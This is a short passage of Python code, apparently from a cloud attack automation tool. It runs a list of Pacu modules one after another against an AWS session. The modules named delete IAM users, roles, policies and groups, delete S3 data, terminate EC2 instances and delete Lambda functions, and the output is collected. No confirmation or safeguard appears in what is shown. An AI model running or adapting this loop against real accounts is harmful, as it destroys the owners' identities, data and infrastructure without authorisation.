            "iam__delete_user",
            "iam__delete_role",
            "iam__delete_policy",
            "iam__delete_group",
            "s3__delete",
            "ec2__terminate",
            "lambda__delete"
        ]
        
        for module in modules:
            try:
                self.logger.info(f"Running PACU module: {module}")
                module_cmd = f"pacu --session {self.pacu_session} --module {module}"
                output = self.run_command(module_cmd)
                if output:
                    results[module] = output
            except Exception as e:
                self.logger.error(f"Error running PACU module {module}: {str(e)}")
                
        return results